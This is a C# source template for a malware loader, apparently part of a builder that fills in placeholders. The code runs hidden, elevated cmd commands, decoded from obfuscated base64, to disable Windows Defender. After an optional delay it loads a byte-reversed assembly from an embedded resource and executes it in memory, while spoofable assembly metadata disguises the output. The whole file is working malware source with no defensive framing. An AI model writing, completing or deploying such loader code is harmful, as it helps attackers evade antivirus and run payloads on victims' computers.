using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

[assembly: Guid("%Guid%")]

public partial class Loader
{
    public static void Main()
    {

#if DefKillWD
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c " + Encoding.ASCII.GetString(Convert.FromBase64String("#KillWDCommands").Reverse().ToArray()) + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                Verb = "runas",
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L1: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif

        try
        {
            int startDelay = 0;
            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
            {
                Thread.Sleep(startDelay * 1000);
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L2: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            Assembly.Load(((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")).Reverse().ToArray()).CreateInstance("Program").GetType().GetMethod("Main").Invoke(null, new object[0]);
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L3: " + Environment.NewLine + ex.ToString());
#endif
        }
    }
}